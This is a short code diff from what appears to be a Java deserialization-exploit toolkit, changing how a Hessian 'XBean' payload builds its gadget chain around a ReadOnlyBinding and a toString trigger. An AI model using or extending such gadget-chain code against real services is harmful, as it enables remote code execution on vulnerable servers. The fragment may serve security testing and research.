@@ -31,6 +31,6 @@ public class XBean extends HessianPayload {
         Context ctx = ReflectionHelper.createWithoutConstructor(WritableContext.class);
         ContextUtil.ReadOnlyBinding binding = new ContextUtil.ReadOnlyBinding("foo", obj, ctx);
         ReflectionHelper.setFieldValue(binding, "boundObj", null);
-        return PayloadHelper.makeTreeSetWithXString(binding);
+        return PayloadHelper.makeTreeSetWithXStringToStringTrigger(binding);
     }
 }
